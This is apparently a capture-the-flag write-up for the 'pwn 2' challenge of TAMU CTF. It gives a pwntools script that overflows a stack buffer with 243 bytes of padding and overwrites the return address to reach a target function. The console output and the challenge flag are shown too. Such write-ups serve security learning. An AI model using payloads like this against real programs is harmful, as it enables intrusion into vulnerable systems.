# **pwn 2**

#### tag : pwnable

-----------------------------------------------

#### Description

>nc pwn.ctf.tamu.edu 4322

-----------------------------------------------

#### Solution

~~~

from pwn import *

DEBUG = False

if DEBUG:
    r = process('./pwn2')
    context.log_level = 'debug'
else:
    r = remote('pwn.ctf.tamu.edu',4322)

land = 0x0804854b

payload = ''
payload += 'a' * 243
payload += p32(land)

print r.recvuntil('me!\n')
r.sendline(payload)
print r.recvuntil('}')


~~~

~~~

[+] Opening connection to pwn.ctf.tamu.edu on port 4322: Done
I just love repeating what other people say!
I bet I can repeat anything you tell me!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaK\x85\x0
This function has been deprecated
gigem{3ch035_0f_7h3_p4s7}
[*] Closed connection to pwn.ctf.tamu.edu port 4322

~~~

**gigem{3ch035_0f_7h3_p4s7}**
